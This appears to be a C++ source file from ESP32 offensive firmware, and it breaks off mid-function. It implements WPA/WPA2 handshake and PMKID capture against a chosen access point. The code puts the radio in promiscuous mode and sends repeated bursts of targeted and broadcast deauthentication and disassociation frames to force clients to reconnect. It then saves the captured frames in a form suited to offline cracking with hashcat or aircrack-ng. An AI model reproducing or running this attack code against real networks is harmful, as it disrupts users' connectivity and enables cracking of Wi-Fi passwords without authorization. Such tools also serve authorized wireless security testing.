/**
 * @file handshake_capture.cpp
 * @brief WPA/WPA2 4-way handshake capture implementation
 */

#include "handshake_capture.h"
#include "../../utils/wifi_utils.h"
#include "../attack/deauth.h"  // For unified deauth utilities

#ifdef ESP32
#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include "modules/wifi/station_scanner.h"
#include "core/event_bus.h"
#endif

namespace adversary {

// Static instance for promiscuous callback
HandshakeCapture* HandshakeCapture::s_instance_ = nullptr;

// EAPOL packet structure offsets (after LLC/SNAP header)
// EAPOL Header: Version(1) + Type(1) + Length(2)
// EAPOL-Key: Descriptor(1) + KeyInfo(2) + KeyLen(2) + ReplayCounter(8) + Nonce(32) + IV(16) + RSC(8) + Reserved(8) + MIC(16) + KeyDataLen(2) + KeyData(var)

static constexpr uint8_t EAPOL_TYPE_KEY = 0x03;
static constexpr uint8_t EAPOL_KEY_DESC_WPA2 = 0x02;
static constexpr uint8_t EAPOL_KEY_DESC_WPA = 0xFE;

// Key Info bit masks
static constexpr uint16_t KEY_INFO_DESC_VER_MASK = 0x0007;  // Bits 0-2
static constexpr uint16_t KEY_INFO_PAIRWISE = 0x0008;       // Bit 3
static constexpr uint16_t KEY_INFO_INSTALL = 0x0040;        // Bit 6
static constexpr uint16_t KEY_INFO_ACK = 0x0080;            // Bit 7
static constexpr uint16_t KEY_INFO_MIC = 0x0100;            // Bit 8
static constexpr uint16_t KEY_INFO_SECURE = 0x0200;         // Bit 9
static constexpr uint16_t KEY_INFO_ERROR = 0x0400;          // Bit 10
static constexpr uint16_t KEY_INFO_REQUEST = 0x0800;        // Bit 11
static constexpr uint16_t KEY_INFO_ENCRYPTED = 0x1000;      // Bit 12

// ===========================================
// HandshakeStats implementation
// ===========================================

uint32_t HandshakeStats::getDurationMs() const {
#ifdef ESP32
    if (captureStartTime == 0) return 0;
    if (handshakeTime > 0) return handshakeTime - captureStartTime;
    return millis() - captureStartTime;
#else
    return 0;
#endif
}

// ===========================================
// Static helper functions
// ===========================================

EAPOLKeyInfo HandshakeCapture::parseKeyInfo(uint16_t keyInfo) {
    EAPOLKeyInfo info;
    info.keyDescVer = keyInfo & KEY_INFO_DESC_VER_MASK;
    info.pairwise = (keyInfo & KEY_INFO_PAIRWISE) != 0;
    info.install = (keyInfo & KEY_INFO_INSTALL) != 0;
    info.keyAck = (keyInfo & KEY_INFO_ACK) != 0;
    info.keyMIC = (keyInfo & KEY_INFO_MIC) != 0;
    info.secure = (keyInfo & KEY_INFO_SECURE) != 0;
    info.error = (keyInfo & KEY_INFO_ERROR) != 0;
    info.request = (keyInfo & KEY_INFO_REQUEST) != 0;
    info.encrypted = (keyInfo & KEY_INFO_ENCRYPTED) != 0;
    return info;
}

HandshakeMessage HandshakeCapture::identifyMessage(const uint8_t* eapolData, uint16_t length) {
    // Minimum EAPOL-Key frame size
    if (length < 99) return HandshakeMessage::UNKNOWN;
    
    // EAPOL header: Version(1) + Type(1) + Length(2) = 4 bytes
    // Check EAPOL type is Key (0x03)
    if (eapolData[1] != EAPOL_TYPE_KEY) return HandshakeMessage::UNKNOWN;
    
    // After EAPOL header comes Key Descriptor
    const uint8_t* keyFrame = eapolData + 4;
    
    // Key Descriptor Type (1 byte) - should be 0x02 (WPA2) or 0xFE (WPA)
    uint8_t descType = keyFrame[0];
    if (descType != EAPOL_KEY_DESC_WPA2 && descType != EAPOL_KEY_DESC_WPA) {
        return HandshakeMessage::UNKNOWN;
    }
    
    // Key Information (2 bytes, big endian)
    uint16_t keyInfo = (keyFrame[1] << 8) | keyFrame[2];
    EAPOLKeyInfo info = parseKeyInfo(keyInfo);
    
    // Identify message based on flags:
    // MSG1: Pairwise, Ack, no MIC, no Install, no Secure
    // MSG2: Pairwise, MIC, no Ack, no Install, no Secure
    // MSG3: Pairwise, Ack, MIC, Install, Secure
    // MSG4: Pairwise, MIC, no Ack, Secure
    
    if (info.pairwise) {
        if (info.keyAck && !info.keyMIC && !info.install && !info.secure) {
            return HandshakeMessage::MSG1;
        }
        if (!info.keyAck && info.keyMIC && !info.install && !info.secure) {
            return HandshakeMessage::MSG2;
        }
        if (info.keyAck && info.keyMIC && info.install && info.secure) {
            return HandshakeMessage::MSG3;
        }
        if (!info.keyAck && info.keyMIC && !info.install && info.secure) {
            return HandshakeMessage::MSG4;
        }
    }
    
    return HandshakeMessage::UNKNOWN;
}

const char* HandshakeCapture::getMessageString(HandshakeMessage msg) {
    switch (msg) {
        case HandshakeMessage::MSG1: return "MSG1";
        case HandshakeMessage::MSG2: return "MSG2";
        case HandshakeMessage::MSG3: return "MSG3";
        case HandshakeMessage::MSG4: return "MSG4";
        default: return "UNKNOWN";
    }
}

const char* HandshakeCapture::getStateString(HandshakeState state) {
    switch (state) {
        case HandshakeState::IDLE: return "Idle";
        case HandshakeState::WAITING: return "Waiting";
        case HandshakeState::GOT_MSG1: return "Got M1";
        case HandshakeState::GOT_MSG2: return "Got M1+M2";
        case HandshakeState::GOT_MSG3: return "Got M1-M3";
        case HandshakeState::CRACKABLE: return "Crackable";
        case HandshakeState::COMPLETE: return "Complete (4/4)";
        case HandshakeState::TIMEOUT: return "Timeout";
        case HandshakeState::ERROR: return "Error";
        default: return "Unknown";
    }
}

// ===========================================
// HandshakeCapture implementation
// ===========================================

static HandshakeCapture* s_instance = nullptr;

HandshakeCapture& HandshakeCapture::getInstance() {
    if (!s_instance) s_instance = new HandshakeCapture();
    return *s_instance;
}

HandshakeCapture::HandshakeCapture()
    : state_(HandshakeState::IDLE)
    , initialized_(false)
    , lastDeauthTime_(0)
    , deauthBurstCount_(0)
    , graceStartTime_(0)
    , waitingForComplete_(false)
{
    stats_.reset();
    handshake_.reset();
}

bool HandshakeCapture::init() {
    if (initialized_) return true;
    
#ifdef ESP32
    Serial.println("[Handshake] Initializing...");
#endif
    
    stats_.reset();
    handshake_.reset();
    initialized_ = true;
    
    return true;
}

void HandshakeCapture::deinit() {
    stop();
    initialized_ = false;
}

bool HandshakeCapture::start(const HandshakeCaptureConfig& config) {
    if (!initialized_ && !init()) {
        return false;
    }
    
    if (!config.hasValidTarget()) {
#ifdef ESP32
        Serial.println("[Handshake] Error: No valid target BSSID");
#endif
        setState(HandshakeState::ERROR);
        return false;
    }
    
    config_ = config;
    stats_.reset();
    handshake_.reset();
    waitingForComplete_ = false;
    graceStartTime_ = 0;
    hasPMKID_ = false;  // Reset PMKID flag for new capture session
    pmkid_.reset();  // Clear PMKID data from previous capture
    discoveredClientCount_ = 0;  // Clear client list from previous captures
    
    // Copy target info to handshake
    memcpy(handshake_.apBssid, config_.targetBssid, 6);
    strncpy(handshake_.ssid, config_.targetSsid, 32);
    handshake_.ssid[32] = '\0';
    handshake_.channel = config_.channel;
    
#ifdef ESP32
    stats_.captureStartTime = millis();
    
    // Station scanning is now done during LOCKING state in handshake_screen
    // Just copy any pre-discovered clients from the station scanner
    discoveredClientCount_ = StationScanner::getInstance().getStationsForAP(
        config_.targetBssid, 
        (uint8_t*)discoveredClients_, 
        MAX_DISCOVERED_CLIENTS
    );
    
    if (discoveredClientCount_ > 0) {
        Serial.printf("[Handshake] Using %d pre-discovered clients for targeted deauth\n", 
                      discoveredClientCount_);
    }
    
    // Disconnect and reset WiFi
    WiFi.disconnect(true);
    WiFi.mode(WIFI_OFF);
    delay(100);
    
    // Use AP+STA mode - required for deauth transmission
    WiFi.mode(WIFI_AP_STA);
    delay(100);
    
    // Start hidden soft AP on target channel (required for raw frame TX)
    WiFi.softAP("adversary_hs", nullptr, config_.channel, 1);  // Hidden AP
    delay(100);
    
    // Set channel explicitly
    wifi_utils::setChannel(config_.channel);
    
    // Set static instance for callback
    s_instance_ = this;
    
    // Enable promiscuous mode with all frames filter (need data for EAPOL)
    auto filter = wifi_utils::allFrameFilter();
    wifi_utils::enablePromiscuous(promiscuousCallback, &filter);
    
    Serial.printf("[Handshake] Started on channel %d, target: %02X:%02X:%02X:%02X:%02X:%02X\n",
                  config_.channel,
                  config_.targetBssid[0], config_.targetBssid[1], config_.targetBssid[2],
                  config_.targetBssid[3], config_.targetBssid[4], config_.targetBssid[5]);
    
    if (config_.autoDeauth) {
        Serial.printf("[Handshake] Auto-deauth enabled, will send %d deauths\n", config_.deauthCount);
    }
#endif
    
    lastDeauthTime_ = 0;
    deauthBurstCount_ = 0;
    setState(HandshakeState::WAITING);
    
    return true;
}

void HandshakeCapture::stop() {
    if (state_ == HandshakeState::IDLE) return;
    
#ifdef ESP32
    wifi_utils::disablePromiscuous();
    s_instance_ = nullptr;
    
    // Stop soft AP and release memory
    WiFi.softAPdisconnect(true);
    // CRITICAL: Turn WiFi OFF to free ~30KB driver memory for Menu icons
    WiFi.mode(WIFI_OFF);
    delay(50);
    
    Serial.println("[Handshake] Stopped");
#endif
    
    setState(HandshakeState::IDLE);
}

void HandshakeCapture::update() {
    if (!isCapturing()) return;
    
    checkTimeout();
    
#ifdef ESP32
    uint32_t now = millis();
    
    // Check grace period for minimum valid handshake
    // Wait for remaining messages before declaring CRACKABLE
    if (waitingForComplete_ && (now - graceStartTime_ >= GRACE_PERIOD_MS)) {
        // Grace period expired - check final state
        if (handshake_.isValid()) {
            // Got all 4 messages during grace period!
            stats_.handshakeTime = now;
            Serial.println("[Handshake] COMPLETE! Full 4-way handshake captured (all 4 messages)!");
            waitingForComplete_ = false;
            setState(HandshakeState::COMPLETE);
            
            // Publish EventBus event
            EventData event(EventType::HANDSHAKE_CAPTURED);
            strncpy(event.payload.handshake.ssid, handshake_.ssid, 32);
            memcpy(event.payload.handshake.bssid, handshake_.apBssid, 6);
            event.payload.handshake.channel = handshake_.channel;
            event.payload.handshake.type = 0;  // 4WAY
            EventBus::getInstance().publish(event);
            
            return;
        } else {
            // Still only minimum valid - declare crackable
            stats_.handshakeTime = graceStartTime_;  // Use when we first became valid
            Serial.println("[Handshake] Grace period expired - crackable handshake (sufficient for hashcat/aircrack-ng)");
            Serial.printf("[Handshake] Have: M1=%d M2=%d M3=%d M4=%d\n",
                          handshake_.hasMsg1, handshake_.hasMsg2,
                          handshake_.hasMsg3, handshake_.hasMsg4);
            waitingForComplete_ = false;
            setState(HandshakeState::CRACKABLE);
            
            // Publish EventBus event
            EventData event(EventType::HANDSHAKE_CAPTURED);
            strncpy(event.payload.handshake.ssid, handshake_.ssid, 32);
            memcpy(event.payload.handshake.bssid, handshake_.apBssid, 6);
            event.payload.handshake.channel = handshake_.channel;
            event.payload.handshake.type = 0;  // 4WAY
            EventBus::getInstance().publish(event);
            
            return;
        }
    }
    
    // Auto-deauth logic - continue until we have a minimum valid handshake
    // Use longer pauses between bursts to give clients time to reconnect
    if (config_.autoDeauth && !handshake_.isMinimumValid()) {
        uint32_t timeSinceStart = now - stats_.captureStartTime;
        
        // Wait PRE_DEAUTH_DELAY before first deauth - let promiscuous mode stabilize
        // This helps catch M1 from clients that were already mid-handshake
        if (timeSinceStart < PRE_DEAUTH_DELAY_MS) {
            return;  // Still in pre-deauth listening window
        }
        
        // Adjust timing to account for pre-deauth delay
        uint32_t timeSinceDeauthStart = timeSinceStart - PRE_DEAUTH_DELAY_MS;
        
        // Burst pattern: send deauthCount deauths quickly, then wait 10 seconds
        // This gives clients time to reconnect and complete the handshake
        static const uint32_t BURST_PAUSE_MS = 10000;  // 10 seconds between bursts
        
        uint32_t burstCycle = timeSinceDeauthStart / BURST_PAUSE_MS;
        uint32_t timeInBurst = timeSinceDeauthStart % BURST_PAUSE_MS;
        
        // Only send during first 2.5 seconds of each burst cycle
        // This means: deauth for 2.5s, then wait 7.5s for handshake
        bool inDeauthWindow = (timeInBurst < (config_.deauthCount * config_.deauthInterval));
        
        if (inDeauthWindow && (now - lastDeauthTime_ >= config_.deauthInterval)) {
            sendDeauth();  // Sends both deauth + disassoc for max effectiveness
            lastDeauthTime_ = now;
            
            // Log burst info
            Serial.printf("[Handshake] Burst %lu, waiting for handshake...\n", 
                          (unsigned long)(burstCycle + 1));
        }
    }
#endif
}

void HandshakeCapture::processEAPOL(const uint8_t* data, uint16_t length, int8_t rssi) {
    if (!isCapturing()) return;
    if (length < 34) return;  // Minimum for LLC/SNAP + EAPOL header
    
    // Track signal strength (keep the strongest signal seen)
    if (rssi < 0 && (handshake_.signalStrength == 0 || rssi > handshake_.signalStrength)) {
        handshake_.signalStrength = rssi;
    }
    
    // First, verify this frame is from/to our target BSSID
    // In 802.11 data frames, BSSID location depends on To/From DS bits
    uint8_t fcFlags = data[1];
    bool toDS = (fcFlags & 0x01) != 0;
    bool fromDS = (fcFlags & 0x02) != 0;
    
    const uint8_t* frameBssid = nullptr;
    if (toDS && !fromDS) {
        // Client to AP: BSSID is at Addr1 (offset 4)
        frameBssid = data + 4;
    } else if (!toDS && fromDS) {
        // AP to client: BSSID is at Addr2 (offset 10)
        frameBssid = data + 10;
    } else if (!toDS && !fromDS) {
        // IBSS: BSSID is at Addr3 (offset 16)
        frameBssid = data + 16;
    } else {
        // WDS (both set): Addr3 is BSSID
        frameBssid = data + 16;
    }
    
    // Verify BSSID matches our target
    bool bssidMatch = true;
    for (int i = 0; i < 6; i++) {
        if (frameBssid[i] != config_.targetBssid[i]) {
            bssidMatch = false;
            break;
        }
    }
    
    if (!bssidMatch) {
        // This EAPOL is from a different network, ignore it
        return;
    }
    
    // The 802.11 header is typically 24-30 bytes
    // After that comes LLC/SNAP (8 bytes): AA AA 03 00 00 00 88 8E
    // Then EAPOL frame
    
    // Find EAPOL start by looking for LLC/SNAP header with EAPOL EtherType
    const uint8_t* eapolStart = nullptr;
    int eapolOffset = -1;
    
    // Search from byte 24 to handle variable 802.11 header sizes (24-30 bytes)
    for (int i = 24; i < (int)length - 8 && i < 40; i++) {
        if (data[i] == 0xAA && data[i+1] == 0xAA && data[i+2] == 0x03 &&
            data[i+3] == 0x00 && data[i+4] == 0x00 && data[i+5] == 0x00 &&
            data[i+6] == 0x88 && data[i+7] == 0x8E) {
            eapolStart = data + i + 8;  // Skip LLC/SNAP header
            eapolOffset = i;
            break;
        }
    }
    
    if (!eapolStart) return;
    
    // Only count as EAPOL if we actually found the LLC/SNAP header
    stats_.eapolFrames++;
    
    uint16_t eapolLen = length - (eapolStart - data);
    
#ifdef ESP32
    Serial.printf("[Handshake] EAPOL from target BSSID, offset=%d, len=%d\\n",
                  eapolOffset, eapolLen);
#else
    (void)eapolOffset;
#endif
    
    // Extract client MAC from frame
    uint8_t clientMac[6];
    if (!extractClientMac(data, clientMac)) return;
    
    // Track discovered clients for targeted deauth
    addDiscoveredClient(clientMac);
    
    // Check if targeting specific client
    if (!config_.captureAllClients) {
        bool macMatch = true;
        for (int i = 0; i < 6; i++) {
            if (clientMac[i] != config_.targetClient[i]) {
                macMatch = false;
                break;
            }
        }
        if (!macMatch) return;
    }
    
    // Identify message type
    HandshakeMessage msg = identifyMessage(eapolStart, eapolLen);
    
#ifdef ESP32
    Serial.printf("[Handshake] EAPOL %s from %02X:%02X:%02X:%02X:%02X:%02X\n",
                  getMessageString(msg),
                  clientMac[0], clientMac[1], clientMac[2],
                  clientMac[3], clientMac[4], clientMac[5]);
#endif
    
    switch (msg) {
        case HandshakeMessage::MSG1:
            stats_.msg1Count++;
            processMessage1(eapolStart, eapolLen, data, length);
            break;
        case HandshakeMessage::MSG2:
            stats_.msg2Count++;
            processMessage2(eapolStart, eapolLen, data, length);
            // Save client MAC
            memcpy(handshake_.clientMac, clientMac, 6);
            break;
        case HandshakeMessage::MSG3:
            stats_.msg3Count++;
            processMessage3(eapolStart, eapolLen, data, length);
            break;
        case HandshakeMessage::MSG4:
            stats_.msg4Count++;
            processMessage4(eapolStart, eapolLen, data, length);
            // Save client MAC
            memcpy(handshake_.clientMac, clientMac, 6);
            break;
        default:
            break;
    }
}

void HandshakeCapture::setState(HandshakeState newState) {
    if (state_ == newState) return;
    
    HandshakeState oldState = state_;
    state_ = newState;
    
    // Publish state change event via EventBus
    EventData event(EventType::ATTACK_STATE_CHANGED);
    event.payload.attack.attackType = static_cast<uint8_t>(AttackTypeId::HANDSHAKE);
    event.payload.attack.oldState = static_cast<int>(oldState);
    event.payload.attack.newState = static_cast<int>(newState);
    EventBus::getInstance().publish(event);
    
#ifdef ESP32
    Serial.printf("[Handshake] State: %s\n", getStateString(newState));
#endif
}

void HandshakeCapture::processMessage1(const uint8_t* eapolData, uint16_t eapolLen,
                                        const uint8_t* frameData, uint16_t frameLen) {
    if (eapolLen < 99) return;
    
    // Extract ANonce (32 bytes at offset 17 in EAPOL-Key)
    const uint8_t* keyFrame = eapolData + 4;  // Skip EAPOL header
    memcpy(handshake_.anonce, keyFrame + 13, 32);  // Nonce offset in key frame
    
    // Save FULL 802.11 frame (not just EAPOL) for WPA-SEC/hashcat compatibility
    uint16_t copyLen = (frameLen < sizeof(handshake_.msg1Data)) ? frameLen : sizeof(handshake_.msg1Data);
    memcpy(handshake_.msg1Data, frameData, copyLen);
    handshake_.msg1Len = copyLen;
    handshake_.hasMsg1 = true;
    
    // Key descriptor version
    uint16_t keyInfo = (keyFrame[1] << 8) | keyFrame[2];
    handshake_.keyDescVer = keyInfo & KEY_INFO_DESC_VER_MASK;
    
    // Try to extract PMKID from M1 Key Data (RSN IE)
    // Key Data Length is at offset 93 (2 bytes, big-endian) in EAPOL-Key
    // Key Data starts at offset 95
    if (eapolLen >= 99) {
        uint16_t keyDataLen = (keyFrame[91] << 8) | keyFrame[92];
        const uint8_t* keyData = keyFrame + 93;
        
        // Search for PMKID in RSN IE within Key Data
        // PMKID format: OUI=00-0F-AC, Type=4, followed by 16-byte PMKID
        if (keyDataLen > 0 && (93 + keyDataLen) <= (eapolLen - 4)) {
            extractPMKID(keyData, keyDataLen);
        }
    }
    
    // Update state (order-independent)
    updateCaptureState();
    
    // Publish EAPOL captured event for notification
    EventData eapolEvt(EventType::EAPOL_CAPTURED);
    memcpy(eapolEvt.payload.handshake.bssid, config_.targetBssid, 6);
    eapolEvt.payload.handshake.channel = config_.channel;
    eapolEvt.payload.handshake.type = 0; // 4WAY
    EventBus::getInstance().publish(eapolEvt);
}

void HandshakeCapture::processMessage2(const uint8_t* eapolData, uint16_t eapolLen,
                                        const uint8_t* frameData, uint16_t frameLen) {
    if (eapolLen < 99) return;
    
    // Extract SNonce (32 bytes)
    const uint8_t* keyFrame = eapolData + 4;
    memcpy(handshake_.snonce, keyFrame + 13, 32);
    
    // Extract MIC (16 bytes at offset 77 in key frame)
    memcpy(handshake_.mic, keyFrame + 77, 16);
    
    // Save FULL 802.11 frame for WPA-SEC/hashcat compatibility
    uint16_t copyLen = (frameLen < sizeof(handshake_.msg2Data)) ? frameLen : sizeof(handshake_.msg2Data);
    memcpy(handshake_.msg2Data, frameData, copyLen);
    handshake_.msg2Len = copyLen;
    handshake_.hasMsg2 = true;
    
    // Update state (order-independent)
    updateCaptureState();
    
    // Publish EAPOL captured event for notification
    EventData eapolEvt(EventType::EAPOL_CAPTURED);
    memcpy(eapolEvt.payload.handshake.bssid, config_.targetBssid, 6);
    eapolEvt.payload.handshake.channel = config_.channel;
    eapolEvt.payload.handshake.type = 0; // 4WAY
    EventBus::getInstance().publish(eapolEvt);
}

void HandshakeCapture::processMessage3(const uint8_t* eapolData, uint16_t eapolLen,
                                        const uint8_t* frameData, uint16_t frameLen) {
    if (eapolLen < 99) return;
    
    // MSG3 also contains ANonce - extract it if we don't have MSG1
    const uint8_t* keyFrame = eapolData + 4;
    
    // If we don't have MSG1 yet, get ANonce from MSG3
    if (!handshake_.hasMsg1) {
        memcpy(handshake_.anonce, keyFrame + 13, 32);
    }
    
    // Save FULL 802.11 frame for WPA-SEC/hashcat compatibility
    uint16_t copyLen = (frameLen < sizeof(handshake_.msg3Data)) ? frameLen : sizeof(handshake_.msg3Data);
    memcpy(handshake_.msg3Data, frameData, copyLen);
    handshake_.msg3Len = copyLen;
    handshake_.hasMsg3 = true;
    
    // Update state (order-independent)
    updateCaptureState();
    
    // Publish EAPOL captured event for notification
    EventData eapolEvt(EventType::EAPOL_CAPTURED);
    memcpy(eapolEvt.payload.handshake.bssid, config_.targetBssid, 6);
    eapolEvt.payload.handshake.channel = config_.channel;
    eapolEvt.payload.handshake.type = 0; // 4WAY
    EventBus::getInstance().publish(eapolEvt);
}

void HandshakeCapture::processMessage4(const uint8_t* eapolData, uint16_t eapolLen,
                                        const uint8_t* frameData, uint16_t frameLen) {
    (void)eapolData;  // Not needed for MSG4, but kept for consistency
    if (eapolLen < 99) return;
    
    // Save FULL 802.11 frame for WPA-SEC/hashcat compatibility
    uint16_t copyLen = (frameLen < sizeof(handshake_.msg4Data)) ? frameLen : sizeof(handshake_.msg4Data);
    memcpy(handshake_.msg4Data, frameData, copyLen);
    handshake_.msg4Len = copyLen;
    handshake_.hasMsg4 = true;
    
    // Update state (order-independent)
    updateCaptureState();
    
    // Publish EAPOL captured event for notification
    EventData eapolEvt(EventType::EAPOL_CAPTURED);
    memcpy(eapolEvt.payload.handshake.bssid, config_.targetBssid, 6);
    eapolEvt.payload.handshake.channel = config_.channel;
    eapolEvt.payload.handshake.type = 0; // 4WAY
    EventBus::getInstance().publish(eapolEvt);
}

void HandshakeCapture::updateCaptureState() {
    // Check what we have and update state accordingly
    // This is order-independent - we just care about having the right pieces
    
#ifdef ESP32
    Serial.printf("[Handshake] Have: M1=%d M2=%d M3=%d M4=%d\n",
                  handshake_.hasMsg1, handshake_.hasMsg2,
                  handshake_.hasMsg3, handshake_.hasMsg4);
#endif
    
    // Check for complete handshake first (all 4 messages)
    // This is the full 4-way handshake - ideal capture
    if (handshake_.isValid()) {
#ifdef ESP32
        stats_.handshakeTime = millis();
        Serial.println("[Handshake] COMPLETE! Full 4-way handshake captured (all 4 messages)!");
#endif
        waitingForComplete_ = false;  // Cancel grace period
        setState(HandshakeState::COMPLETE);
        
        // Publish EventBus event
        EventData event(EventType::HANDSHAKE_CAPTURED);
        strncpy(event.payload.handshake.ssid, handshake_.ssid, 32);
        memcpy(event.payload.handshake.bssid, handshake_.apBssid, 6);
        event.payload.handshake.channel = handshake_.channel;
        event.payload.handshake.type = 0;  // 4WAY
        EventBus::getInstance().publish(event);
        
        return;
    }
    
    // Check for minimum valid handshake (M2 with MIC/SNonce + ANonce from M1 or M3)
    // Start grace period to wait for remaining messages (M3/M4)
    if (handshake_.isMinimumValid() && !waitingForComplete_) {
#ifdef ESP32
        Serial.println("[Handshake] Minimum valid reached - starting grace period for remaining messages...");
        graceStartTime_ = millis();
#endif
        waitingForComplete_ = true;
        // Don't trigger callback yet - wait for grace period in update()
    }
    
    // Update intermediate state based on what we have
    if (handshake_.hasMsg3 || handshake_.hasMsg4) {
        if (state_ < HandshakeState::GOT_MSG3) {
            setState(HandshakeState::GOT_MSG3);
        }
    } else if (handshake_.hasMsg2) {
        if (state_ < HandshakeState::GOT_MSG2) {
            setState(HandshakeState::GOT_MSG2);
        }
    } else if (handshake_.hasMsg1) {
        if (state_ < HandshakeState::GOT_MSG1) {
            setState(HandshakeState::GOT_MSG1);
        }
    }
}

#ifdef ESP32
void HandshakeCapture::promiscuousCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (!s_instance_ || !s_instance_->isCapturing()) return;
    
    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    uint8_t* payload = pkt->payload;
    uint16_t len = pkt->rx_ctrl.sig_len;
    
    // Frame type/subtype is in first byte
    uint8_t frameControl = payload[0];
    uint8_t frameType = (frameControl & 0x0C) >> 2;
    uint8_t frameSubtype = (frameControl & 0xF0) >> 4;
    
    // Handle management frames (type 0)
    if (type == WIFI_PKT_MGMT && frameType == 0) {
        // Beacon frame only (subtype 8) - NOT Probe Response (subtype 5)
        // WPA-SEC/hcxpcapngtool requires actual Beacon for proper SSID identification
        if (frameSubtype == 8) {
            // BSSID is at offset 16 in management frames
            const uint8_t* bssid = payload + 16;
            
            // Check if from our target BSSID
            if (memcmp(bssid, s_instance_->config_.targetBssid, 6) == 0) {
                // Capture beacon if we don't have one yet
                if (!s_instance_->handshake_.hasBeacon()) {
                    s_instance_->handshake_.setBeacon(payload, len);
                    Serial.printf("[Handshake] Captured beacon frame (%d bytes)\n", len);
                }
            }
        }
        return;
    }
    
    // Handle data frames (type 2) - check for EAPOL
    if (type == WIFI_PKT_DATA && frameType == 2) {
        s_instance_->processEAPOL(payload, len, pkt->rx_ctrl.rssi);
    }
}
#endif

void HandshakeCapture::sendDeauth() {
#ifdef ESP32
    // Use unified deauth utility for targeted clients + broadcast fallback
    // alsoDisassoc=true sends both deauth and disassoc frames for maximum effectiveness
    
    // Send targeted deauth+disassoc to each discovered client
    for (uint8_t i = 0; i < discoveredClientCount_; i++) {
        if (DeauthAttack::sendSingleDeauth(config_.targetBssid, discoveredClients_[i],
                                           DeauthReason::CLASS3_FRAME_FROM_NONASSOC, true)) {
            stats_.deauthsSent += 2;  // Count both deauth and disassoc
            Serial.printf("[Handshake] Sent targeted deauth+disassoc to %02X:%02X:%02X:%02X:%02X:%02X\n",
                          discoveredClients_[i][0], discoveredClients_[i][1], discoveredClients_[i][2],
                          discoveredClients_[i][3], discoveredClients_[i][4], discoveredClients_[i][5]);
        }
    }
    
    // Always send broadcast deauth+disassoc as fallback
    if (DeauthAttack::sendSingleDeauth(config_.targetBssid, Deauth80211::BROADCAST_MAC,
                                       DeauthReason::CLASS3_FRAME_FROM_NONASSOC, true)) {
        stats_.deauthsSent += 2;
        if (discoveredClientCount_ == 0) {
            Serial.printf("[Handshake] Sent deauth+disassoc broadcast (%lu/%d)\n", 
                          (unsigned long)(deauthBurstCount_ + 1), config_.deauthCount);
        }
    } else {
        Serial.println("[Handshake] Deauth TX failed");
    }
#endif
}

void HandshakeCapture::addDiscoveredClient(const uint8_t* clientMac) {
    // Check if already tracked
    for (uint8_t i = 0; i < discoveredClientCount_; i++) {
        if (memcmp(discoveredClients_[i], clientMac, 6) == 0) {
            return;  // Already known
        }
    }
    
    // Add if space available
    if (discoveredClientCount_ < MAX_DISCOVERED_CLIENTS) {
        memcpy(discoveredClients_[discoveredClientCount_], clientMac, 6);
        discoveredClientCount_++;
#ifdef ESP32
        Serial.printf("[Handshake] Discovered client: %02X:%02X:%02X:%02X:%02X:%02X\n",
                      clientMac[0], clientMac[1], clientMac[2],
                      clientMac[3], clientMac[4], clientMac[5]);
#endif
    }
}



void HandshakeCapture::checkTimeout() {
    if (config_.timeoutMs == 0) return;  // No timeout
    
#ifdef ESP32
    uint32_t elapsed = millis() - stats_.captureStartTime;
    if (elapsed >= config_.timeoutMs) {
        Serial.println("[Handshake] Timeout reached");
        setState(HandshakeState::TIMEOUT);
    }
#endif
}

bool HandshakeCapture::extractClientMac(const uint8_t* frame, uint8_t* clientMac) {
    // In 802.11 data frames, address positions depend on To/From DS bits
    // Typically:
    // - To DS=1, From DS=0: Addr1=BSSID, Addr2=SA(client), Addr3=DA
    // - To DS=0, From DS=1: Addr1=DA, Addr2=BSSID, Addr3=SA(client)
    
    uint8_t fcFlags = frame[1];
    bool toDS = (fcFlags & 0x01) != 0;
    bool fromDS = (fcFlags & 0x02) != 0;
    
    if (toDS && !fromDS) {
        // Client to AP: SA is at offset 10
        memcpy(clientMac, frame + 10, 6);
        return true;
    } else if (!toDS && fromDS) {
        // AP to client: DA is at offset 4
        memcpy(clientMac, frame + 4, 6);
        return true;
    }
    
    // Other cases (IBSS, WDS) - just use addr2
    memcpy(clientMac, frame + 10, 6);
    return true;
}

void HandshakeCapture::extractPMKID(const uint8_t* keyData, uint16_t keyDataLen) {
    // PMKID is found in the RSN PMKID-List within Key Data of M1
    // RSN IE format: Tag(1) + Length(1) + Version(2) + GroupCipher(4) + 
    //                PairwiseCnt(2) + Pairwise(4*n) + AKMCnt(2) + AKM(4*n) + 
    //                RSNCaps(2) + PMKIDCnt(2) + PMKID(16*n)
    // 
    // We're looking for PMKID KDE (Key Data Encapsulation):
    // Type=0xDD, Length, OUI(00-0F-AC), DataType(4=PMKID), PMKID(16 bytes)
    
    if (keyDataLen < 22) return;  // Minimum for PMKID KDE
    
    for (uint16_t i = 0; i < keyDataLen - 22; ) {
        uint8_t tag = keyData[i];
        uint8_t len = keyData[i + 1];
        
        if (i + 2 + len > keyDataLen) break;  // Prevent overflow
        
        // Check for PMKID KDE: 0xDD (vendor-specific), OUI=00-0F-AC, Type=4
        if (tag == 0xDD && len >= 20) {
            // Check OUI: 00-0F-AC (IEEE 802.11)
            if (keyData[i + 2] == 0x00 && 
                keyData[i + 3] == 0x0F && 
                keyData[i + 4] == 0xAC &&
                keyData[i + 5] == 0x04) {  // Type 4 = PMKID
                
                // Found PMKID! Copy it
                pmkid_.reset();
                memcpy(pmkid_.pmkid, keyData + i + 6, 16);
                memcpy(pmkid_.bssid, config_.targetBssid, 6);
                strncpy(pmkid_.ssid, config_.targetSsid, 32);
                pmkid_.ssid[32] = '\0';
                
#ifdef ESP32
                pmkid_.timestamp = millis();
                // Get our own MAC as station MAC
                esp_wifi_get_mac(WIFI_IF_STA, pmkid_.staMac);
                
                Serial.printf("[Handshake] PMKID captured! %02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X\n",
                    pmkid_.pmkid[0], pmkid_.pmkid[1], pmkid_.pmkid[2], pmkid_.pmkid[3],
                    pmkid_.pmkid[4], pmkid_.pmkid[5], pmkid_.pmkid[6], pmkid_.pmkid[7],
                    pmkid_.pmkid[8], pmkid_.pmkid[9], pmkid_.pmkid[10], pmkid_.pmkid[11],
                    pmkid_.pmkid[12], pmkid_.pmkid[13], pmkid_.pmkid[14], pmkid_.pmkid[15]);
#endif
                hasPMKID_ = true;
                
                // Publish PMKID captured event
                EventData pmkidEvt(EventType::PMKID_CAPTURED);
